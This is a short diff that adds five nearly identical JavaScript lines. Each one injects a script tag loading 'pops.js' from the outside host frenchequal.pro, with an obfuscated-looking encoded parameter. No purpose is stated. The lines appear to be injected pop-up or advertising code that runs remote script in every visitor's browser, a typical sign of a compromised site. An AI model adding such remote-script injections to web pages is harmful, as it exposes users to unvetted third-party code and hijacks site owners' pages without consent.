@@ -1,0 +1,5 @@
+(function(d){let s=d.createElement('script');s.async=true;s.src='https://frenchequal.pro/code/pops.js?h=waWQiOjEwMjg3NzcsInNpZCI6MTA3NDQ4Nywid2lkIjoyNzc2MzMsInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);
+(function(d){let s=d.createElement('script');s.async=true;s.src='https://frenchequal.pro/code/pops.js?h=waWQiOjEwMjg3NzcsInNpZCI6MTA3NDQ4Nywid2lkIjoyNzc2MzQsInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);
+(function(d){let s=d.createElement('script');s.async=true;s.src='https://frenchequal.pro/code/pops.js?h=waWQiOjEwMjg3NzcsInNpZCI6MTA3NDQ4Nywid2lkIjoyNzc2NDMsInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);
+(function(d){let s=d.createElement('script');s.async=true;s.src='https://frenchequal.pro/code/pops.js?h=waWQiOjEwMjg3NzcsInNpZCI6MTA3NDQ4Nywid2lkIjoyNzc2MzUsInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);
+(function(d){let s=d.createElement('script');s.async=true;s.src='https://frenchequal.pro/code/pops.js?h=waWQiOjEwMjg3NzcsInNpZCI6MTA3NDQ4Nywid2lkIjoyNzc1OTksInNyYyI6Mn0=eyJ';d.head.appendChild(s);})(document);
